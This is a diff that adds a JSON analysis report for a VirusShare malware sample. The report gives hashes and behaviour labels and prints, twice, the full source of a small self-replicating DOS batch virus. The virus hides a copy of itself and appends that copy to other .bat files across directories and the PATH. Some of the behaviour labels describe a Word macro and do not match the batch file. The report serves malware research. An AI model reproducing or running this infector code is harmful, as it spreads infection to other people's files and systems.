@@ -1,0 +1,75 @@
+{
+    "docinfo": {
+        "attributes": [],
+        "behavior": {
+            "autoexec": "Runs when the Word document is opened",
+            "call": "May call a DLL using Excel 4 Macros",
+            "command": "May run PowerShell commands"
+        },
+        "macro": "@echo off%_FBi%\nif '%1=='FBi goto FBi%2\nset FBi=%0.bat\nif not exist %FBi% set FBi=%0\nif '%FBi%==' set FBi=autoexec.bat\nif exist c:\\_FBi.bat goto FBi_go\nif not exist %FBi% goto evol_FBi\nfind \"FBi\"<%FBi%>c:\\_FBi.bat\nattrib c:\\_FBi.bat +h\n:FBi_go\nif '%!FBi%=='- goto FBi_exit\nset !FBi=%!FBi%-\ncommand /e:5000 /c c:\\_FBi FBi v . .. \\ %path%\n:evol_FBi\nset FBi=\ngoto FBi_pay\n:FBiv\n:: FBi\n:: FBi\nfor %%a in (*.bat) do call c:\\_FBi FBi inf %%a\nexit FBi\n:FBi_inf\nfind \"FBi\"<%3>nul\nif not errorlevel 1 goto FBi_jump\ntype %3>FBi$\necho.>>FBi$\ntype c:\\_FBi.bat>>FBi$\nmove FBi$ %3>nul\nset FBi!=%FBi!%-\nif %FBi#%==------exit\n:FBi_jump\nset FBi!=%FBi!%-\nif %FBi!%==-exit\n:FBi_pay\n:: no payload\n:: and no error\n:: lets get\n:: done with\n:: our virii\n:FBi_exit"
+    },
+    "filename": "VirusShare_3510c592e297b05bfe3a029d26ca30b4",
+    "filesize": 781,
+    "filetype": "DOS batch file, ASCII text, with CRLF line terminators",
+    "hashes": {
+        "md5": "3510c592e297b05bfe3a029d26ca30b4",
+        "sha1": "589ab74d1a043ed7338ca1a1624280bea5b61deb",
+        "sha256": "23c76d638380ebb5c72eff16a1227a40cd5eee7183843629e5e479b2f07f0633"
+    },
+    "peinfo": {},
+    "strings": {
+        "dump": [
+            "@echo off%_FBi%",
+            "if '%1=='FBi goto FBi%2",
+            "set FBi=%0.bat",
+            "if not exist %FBi% set FBi=%0",
+            "if '%FBi%==' set FBi=autoexec.bat",
+            "if exist c:\\_FBi.bat goto FBi_go",
+            "if not exist %FBi% goto evol_FBi",
+            "find \"FBi\"<%FBi%>c:\\_FBi.bat",
+            "attrib c:\\_FBi.bat +h",
+            ":FBi_go",
+            "if '%!FBi%=='- goto FBi_exit",
+            "set !FBi=%!FBi%-",
+            "command /e:5000 /c c:\\_FBi FBi v . .. \\ %path%",
+            ":evol_FBi",
+            "set FBi=",
+            "goto FBi_pay",
+            ":FBiv",
+            ":: FBi",
+            ":: FBi",
+            "for %%a in (*.bat) do call c:\\_FBi FBi inf %%a",
+            "exit FBi",
+            ":FBi_inf",
+            "find \"FBi\"<%3>nul",
+            "if not errorlevel 1 goto FBi_jump",
+            "type %3>FBi$",
+            "echo.>>FBi$",
+            "type c:\\_FBi.bat>>FBi$",
+            "move FBi$ %3>nul",
+            "set FBi!=%FBi!%-",
+            "if %FBi#%==------exit",
+            ":FBi_jump",
+            "set FBi!=%FBi!%-",
+            "if %FBi!%==-exit",
+            ":FBi_pay",
+            ":: no payload",
+            ":: and no error",
+            ":: lets get",
+            ":: done with",
+            ":: our virii",
+            ":FBi_exit"
+        ],
+        "file": {},
+        "fuzzing": {},
+        "ip": [],
+        "url": []
+    },
+    "time": "0:00:00.291430",
+    "version": "6.0.3",
+    "virustotal": {
+        "positives": "",
+        "total": ""
+    },
+    "yara_plugins": []
+}
